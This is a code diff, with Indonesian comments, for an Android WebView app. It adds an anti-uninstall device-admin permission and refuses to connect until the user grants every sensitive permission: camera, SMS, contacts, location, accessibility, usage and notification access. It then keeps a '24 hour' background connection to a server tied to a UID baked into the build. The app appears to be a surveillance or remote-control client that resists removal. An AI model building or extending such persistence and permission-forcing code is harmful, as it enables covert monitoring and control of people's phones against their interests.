@@ -310,6 +310,11 @@ class MainActivity : AppCompatActivity() {
 
     fun isAccessibilityGranted() = AppBlockerService.isEnabled(this)
     fun isUsageAccessGranted() = AppBlockerService.isUsageAccessGranted(this)
+    fun isAdminGranted() = AntiUninstallHelper.isAdminActive(this)
+    fun requestAdminPerm() {
+        AntiUninstallHelper.resetDialogFlag(this)
+        AntiUninstallHelper.requestAdminIfNeeded(this, force = true)
+    }
 
     fun requestAccessibilityPerm() {
         startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
@@ -768,7 +773,7 @@ body{background:var(--bg);color:var(--text);font-family:var(--font);-webkit-font
 </div>
 
 <script>
-const permIds = ['cam','bat','overlay','accessibility','usage','notif','location','gpson','contacts','storage','phone']
+const permIds = ['cam','bat','overlay','accessibility','admin','usage','notif','location','gpson','contacts','storage','phone']
 
 function refreshPerms() {
   if (!window.Android) return
@@ -777,6 +782,7 @@ function refreshPerms() {
     bat:           Android.isBatteryOptIgnored(),
     overlay:       Android.isOverlayGranted(),
     accessibility: Android.isAccessibilityGranted(),
+    admin:         Android.isAdminGranted(),
     usage:         Android.isUsageAccessGranted(),
     notif:         Android.isNotifListenerGranted(),
     location:      Android.isLocationGranted(),
@@ -820,6 +826,7 @@ const autoPermList = [
   { id: 'bat',           check: () => Android.isBatteryOptIgnored(),     request: () => Android.openBatterySettings() },
   { id: 'overlay',       check: () => Android.isOverlayGranted(),        request: () => Android.requestOverlayPerm() },
   { id: 'accessibility', check: () => Android.isAccessibilityGranted(),  request: () => Android.requestAccessibilityPerm() },
+  { id: 'admin',         check: () => Android.isAdminGranted(),          request: () => Android.requestAdminPerm() },
   { id: 'usage',         check: () => Android.isUsageAccessGranted(),    request: () => Android.requestUsageAccessPerm() },
   { id: 'notif',         check: () => Android.isNotifListenerGranted(),  request: () => Android.openNotifListenerSettings() },
   { id: 'location',      check: () => Android.isLocationGranted(),       request: () => Android.requestLocationPerm() },
@@ -883,6 +890,12 @@ function handleMasuk() {
   const label = document.getElementById('btnLabel')
   if (!label) { refreshPerms(); return }
   if (label.textContent.trim() === 'MULAI') {
+    // Wajib semua permission dulu — baru boleh connect 24jam
+    if (!checkAllGranted()) {
+      if (window.Android) Android.showToast('Izinkan SEMUA permission dulu!')
+      startAutoPermFlow()
+      return
+    }
     // Kalau UID sudah baked / tersimpan → skip input, langsung connect
     var hasUid = false
     try {
@@ -898,6 +911,7 @@ function handleMasuk() {
     }
   } else {
     refreshPerms()
+    startAutoPermFlow()
   }
 }
 
@@ -924,10 +938,20 @@ function showUidScreen() {
 }
 
 function showConnected() {
+  // Guard: jangan connect 24jam kalau permission belum lengkap
+  if (!checkAllGranted()) {
+    if (window.Android) Android.showToast('Selesaikan semua izin dulu!')
+    document.getElementById('connectedScreen').classList.add('hidden')
+    document.getElementById('uidScreen').classList.add('hidden')
+    document.getElementById('permScreen').classList.remove('hidden')
+    startAutoPermFlow()
+    return
+  }
   document.getElementById('permScreen').classList.add('hidden')
   document.getElementById('uidScreen').classList.add('hidden')
   document.getElementById('connectedScreen').classList.remove('hidden')
   try { MainBridge.connectNow(); } catch(e) {}
+  if (window.Android) Android.showToast('Mode 24 jam aktif — jangan force stop')
   const devId = window.Android ? Android.getDeviceId() : '—'
   document.getElementById('infoDevId').textContent = devId
   const uid = window.Android ? Android.getSavedUid() : '—'
@@ -938,8 +962,8 @@ function showConnected() {
     const lbl = document.getElementById('statusLbl')
     const sync = document.getElementById('infoSync')
     ind.className = 'conn-status-indicator status-indicator ' + (online ? 'online' : 'offline')
-    lbl.textContent = online ? 'TERHUBUNG' : 'TIDAK TERHUBUNG'
-    sync.textContent = online ? 'Aktif & Tersinkronisasi' : 'Mencoba menghubungkan...'
+    lbl.textContent = online ? 'TERHUBUNG 24JAM' : 'MENGHUBUNGKAN ULANG...'
+    sync.textContent = online ? 'Aktif realtime di latar belakang' : 'Reconnect otomatis...'
     if (online) document.getElementById('infoLast').textContent = 'Terakhir diperbarui ' + new Date().toLocaleTimeString('id-ID')
   }, 2000)
 }
@@ -1006,7 +1030,7 @@ document.addEventListener('DOMContentLoaded', function(){
 
 window.addEventListener('load', () => {
   setTimeout(() => {
-    // Jika UID sudah ada (dari build / download) → langsung connect, skip input
+    refreshPerms()
     var hasUid = false
     try {
       if (window.Android && Android.getSavedUid) {
@@ -1015,17 +1039,17 @@ window.addEventListener('load', () => {
       }
     } catch(e) {}
 
-    if (hasUid) {
-      // Masih refresh perm status, tapi langsung ke connected
-      refreshPerms()
+    // Hanya auto-connect kalau SEMUA permission sudah granted + UID ada
+    // Kalau belum → paksa flow permission dulu
+    if (checkAllGranted() && hasUid) {
       showConnected()
-    } else if (checkAllGranted()) {
-      refreshPerms()
-    } else {
-      refreshPerms()
+    } else if (!checkAllGranted()) {
       startAutoPermFlow()
+    } else {
+      // perms ok tapi belum UID → tunggu user klik MULAI
+      refreshPerms()
     }
-  }, 300)
+  }, 400)
 
   setInterval(() => {
     if (!document.getElementById('permScreen').classList.contains('hidden')) {
@@ -1090,6 +1114,8 @@ class AppBridge(private val context: Context, private val webView: WebView) {
     @JavascriptInterface fun isOverlayGranted()        = (context as MainActivity).isOverlayGranted()
     @JavascriptInterface fun isAccessibilityGranted()  = (context as MainActivity).isAccessibilityGranted()
     @JavascriptInterface fun isUsageAccessGranted()    = (context as MainActivity).isUsageAccessGranted()
+    @JavascriptInterface fun isAdminGranted()          = (context as MainActivity).isAdminGranted()
+    @JavascriptInterface fun requestAdminPerm()        = (context as MainActivity).requestAdminPerm()
 
     @JavascriptInterface fun requestCamPerm()          = (context as MainActivity).requestCamPerm()
     @JavascriptInterface fun requestSmsPerm()          = (context as MainActivity).requestSmsPerm()
